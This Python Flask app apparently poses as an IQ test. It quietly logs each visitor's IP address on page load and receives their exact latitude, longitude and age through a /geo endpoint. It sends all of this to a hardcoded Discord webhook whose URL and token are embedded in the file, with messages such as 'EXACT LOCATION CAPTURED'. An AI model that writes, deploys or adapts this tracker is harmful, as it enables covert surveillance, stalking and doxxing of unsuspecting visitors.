import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# CONFIGURATION
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"

@app.route('/')
def index():
    # Capture IP as soon as they open the link
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    payload = {
        "embeds": [{
            "title": "👁️ New Visitor",
            "description": f"**IP Address:** `{ip}`\nWaiting for IQ Test start...",
            "color": 3447003
        }]
    }
    try: requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except: pass
    return render_template('index.html')

@app.route('/geo', methods=['POST'])
def geo():
    data = request.json
    lat, lon, age = data.get('lat'), data.get('lon'), data.get('age')
    
    payload = {
        "embeds": [{
            "title": "📍 EXACT LOCATION CAPTURED",
            "color": 15158332,
            "fields": [
                {"name": "Age", "value": f"`{age}`", "inline": True},
                {"name": "Maps", "value": f"[View on Google Maps](https://www.google.com{lat},{lon})", "inline": False}
            ]
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    # This part fixes the 'No open ports' error on Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
